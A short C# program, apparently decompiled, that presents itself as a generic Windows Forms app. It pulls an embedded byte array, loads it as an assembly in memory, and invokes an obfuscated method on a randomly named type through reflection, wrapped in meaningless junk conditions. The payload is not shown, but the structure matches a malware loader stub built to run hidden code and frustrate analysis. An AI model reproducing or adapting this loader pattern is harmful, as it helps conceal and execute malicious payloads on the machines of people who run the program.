using System;
using System.Diagnostics;
using System.Linq;
using System.Reflection;

namespace WindowsFormsApp15;

internal class Program
{
	private static void Main()
	{
		Process currentProcess = Process.GetCurrentProcess();
		int size = IntPtr.Size;
		byte[] array = Trak.Array();
		_ = DateTime.Now;
		if (array == null || currentProcess.Id <= 1)
		{
			return;
		}
		Assembly assembly = Assembly.Load(array);
		if (size > 2)
		{
			Type type = assembly.GetTypes().First((Type x) => x.FullName == "Kfdqmgfvjfvcbevwgly.Kbhzdqcprmpinzqgseb");
			if (array.Length > 3)
			{
				((MethodInfo)type.GetMember("Gzdylkomsi")[0]).DeclaringType!.InvokeMember("Gzdylkomsi", BindingFlags.InvokeMethod, null, null, null);
			}
		}
	}
}
